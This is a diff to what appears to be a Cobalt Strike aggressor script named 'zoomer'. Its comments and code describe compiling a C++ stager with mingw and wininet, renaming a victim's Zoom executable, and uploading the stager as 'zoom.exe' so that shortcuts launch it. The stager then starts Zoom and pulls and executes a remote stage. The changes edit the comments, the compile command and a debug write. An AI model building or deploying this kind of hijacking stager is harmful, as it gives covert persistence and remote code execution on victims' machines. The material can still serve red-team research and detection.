@@ -7,11 +7,11 @@
 # if the Zoom executable located in the the Zoom "bin" directory gets replaced with  
 # another one. All the Symbolic links (short cuts) will point to this new exe.
 # 
-# Script Funcationality: This aggressor script calls a golang program (exe) set by user
-# to build a C stager to upload to victim machine. The Aggressor script then renames 
-# the pre-existing zoom executable to a generic name and uploads the freshly minted 
-# stager onto the victim system (under the zoom directory) with the file name "zoom.exe".
-# 
+# Functionality: This script generates a C++ stager using the operator provided arguments
+# (Compilation is currently handled by mingw and generates a 32bit exe). The script then 
+# renames the zoom executable on the filesystem to a user-defined name and uploads the 
+# stager to the zoom directory under the file name "zoom.exe".
+#
 # This stager will then run the Zoom Executable using its modified name and then pull the 
 # stage from the specified address and execute it.
 #
@@ -71,6 +71,7 @@ alias zoomer {
         blog($1,"Created New Stager Source $STAGER");
 
         # Preparing Compilation 
+        # Modify as Needed
         $exe = "$outputDir" . "$output_file";
         blog($1,"Attempting to Compile Stager");
         @command = @("$compiler", "-w", "-o", "$exe", "$STAGER", "-l", "wininet");
@@ -101,10 +102,6 @@ alias zoomer {
 
             # Close handle to file
             closef($exe);
-
-            $out = openf(">test.exe");
-            writeb($out, $data);
-            closef($out);
         
         } else {
 
